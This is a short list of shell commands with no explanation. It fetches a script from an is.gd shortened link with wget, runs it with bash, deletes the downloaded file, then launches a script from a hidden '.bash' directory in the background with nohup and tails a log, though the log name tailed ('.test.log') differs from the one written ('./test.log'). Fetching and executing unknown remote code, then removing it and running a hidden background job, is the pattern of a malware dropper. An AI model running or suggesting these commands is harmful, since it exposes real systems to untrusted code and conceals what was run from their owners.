wget https://is.gd/CQveCD
bash ./CQveCD
top
rm ./CQveCD
cd .bash/
nohup bash ./test.sh > ./test.log 2>&1 &
echo "hello"
echo $! > save_pid.txt
tail -f .test.log
